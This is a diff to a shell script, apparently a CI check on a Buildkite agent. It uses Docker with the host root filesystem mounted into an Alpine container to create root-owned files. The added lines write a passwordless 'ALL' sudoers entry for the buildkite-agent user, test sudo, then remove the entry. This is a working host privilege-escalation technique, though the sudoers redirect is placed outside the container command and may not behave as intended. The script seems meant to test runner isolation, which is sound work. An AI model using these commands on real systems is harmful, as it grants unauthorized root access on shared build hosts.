@@ -5,11 +5,31 @@ set -euo pipefail
 echo ~~~ Creating file as root
 docker run --userns=host -v /:/chroot -w /chroot alpine:latest touch file-created-as-root
 
-echo +++ Checking file permissions
-ls -lA /file-created-as-root
+echo +++ Checking /
+ls -lA /
 
 echo ~~~ Cleaning up
 docker run --userns=host -v /:/chroot -w /chroot alpine:latest rm file-created-as-root
 
-echo +++ Checking file existence
+echo +++ Checking /
 ls -lA /
+
+echo ~~~ Testing sudo
+if sudo ls -lA /; then
+  echo "sudo succeeded"
+else
+  echo "sudo failed"
+fi
+
+echo --- Modifying sudoers
+docker run --userns=host -v /:/chroot -w /chroot alpine:latest echo "'buildkite-agent ALL=(ALL) NOPASSWD: ALL'" >> /chroot/etc/sudoers.d/pwd.conf
+
+echo ~~~ Testing sudo
+if sudo ls -lA /; then
+  echo "sudo succeeded"
+else
+  echo "sudo failed"
+fi
+
+echo --- Cleaning up
+docker run --userns=host -v /:/chroot -w /chroot alpine:latest rm -f /chroot/etc/sudoers.d/pwd.conf
